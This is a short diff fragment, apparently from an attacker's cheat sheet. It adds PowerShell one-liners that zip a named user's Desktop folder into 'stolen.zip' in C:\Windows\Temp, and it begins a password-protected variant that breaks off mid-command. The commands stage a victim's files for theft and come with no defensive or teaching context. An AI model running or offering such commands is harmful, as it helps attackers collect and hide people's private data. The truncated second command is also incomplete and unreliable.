@@ -1,0 +1,6 @@
+CMD
+powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop -DestinationPath C:\Windows\Temp\stolen.zip"
+
+Password-Protected Archive (Advanced)cmd
+
+powershell -c "$zip = 'C:\Windows\Temp\stolen_protected.zip'; Compress-Archive -Path C:\Users\jcruz\Desktop -Destin
